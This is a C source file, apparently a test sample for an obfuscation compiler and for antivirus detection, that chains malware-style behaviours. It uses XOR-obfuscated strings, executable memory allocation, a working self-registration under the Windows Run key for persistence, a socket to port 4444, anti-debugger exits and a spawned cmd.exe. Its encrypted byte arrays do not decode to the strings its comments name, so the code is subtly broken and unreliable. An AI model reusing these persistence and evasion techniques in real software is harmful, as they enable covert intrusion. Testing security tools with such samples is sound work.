/*
 * JOCKY Test Payload - Windows
 * Demonstrates obfuscation pipeline without COM/WMI dependencies
 * This is a test file for the SIH-148 compiler framework.
 */

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

// Encrypted strings (XOR 0x55)
// "cmd.exe" -> XOR'd
unsigned char s_cmd[] = {0x36, 0x26, 0x22, 0x70, 0x26, 0x37, 0x00};
// "127.0.0.1" -> XOR'd  
unsigned char s_ip[] = {0x62, 0x36, 0x65, 0x70, 0x36, 0x65, 0x70, 0x36, 0x64, 0x00};
// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
unsigned char s_runkey[] = {
    0x26, 0x36, 0x29, 0x24, 0x31, 0x36, 0x37, 0x71, 0x71, 0x2c, 0x22, 0x37, 0x36, 0x36, 0x31, 0x36,
    0x29, 0x24, 0x71, 0x71, 0x37, 0x22, 0x36, 0x25, 0x36, 0x30, 0x71, 0x71, 0x26, 0x37, 0x37, 0x36,
    0x36, 0x26, 0x24, 0x31, 0x22, 0x36, 0x37, 0x71, 0x71, 0x36, 0x37, 0x2d, 0x00
};

void decrypt_string(unsigned char* str) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= 0x55;
    }
}

void test_virtual_alloc_exec() {
    // Allocate RWX memory - suspicious behavior
    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem) {
        // Write simple shellcode (just ret)
        unsigned char shellcode[] = {0xC3};
        memcpy(mem, shellcode, sizeof(shellcode));
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

void test_registry_persistence() {
    HKEY hKey;
    decrypt_string(s_runkey);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, (char*)s_runkey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "JOCKYTest", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

void test_network_connection() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock != INVALID_SOCKET) {
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        decrypt_string(s_ip);
        addr.sin_addr.s_addr = inet_addr((char*)s_ip);
        addr.sin_port = htons(4444);
        
        // Try to connect (will fail in test environment)
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        closesocket(sock);
    }
    
    WSACleanup();
}

void test_process_injection_technique() {
    // Open current process with all access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (hProcess) {
        CloseHandle(hProcess);
    }
}

void test_anti_debug() {
    // Check if debugger present
    if (IsDebuggerPresent()) {
        ExitProcess(1);
    }
    
    // Check remote debugger
    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    if (dbg) {
        ExitProcess(1);
    }
}

int main(int argc, char* argv[]) {
    // Anti-debug checks
    test_anti_debug();
    
    // Suspicious behaviors for AV testing
    test_virtual_alloc_exec();
    test_registry_persistence();
    test_network_connection();
    test_process_injection_technique();
    
    // Create a child process
    decrypt_string(s_cmd);
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, (char*)s_cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 1000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}
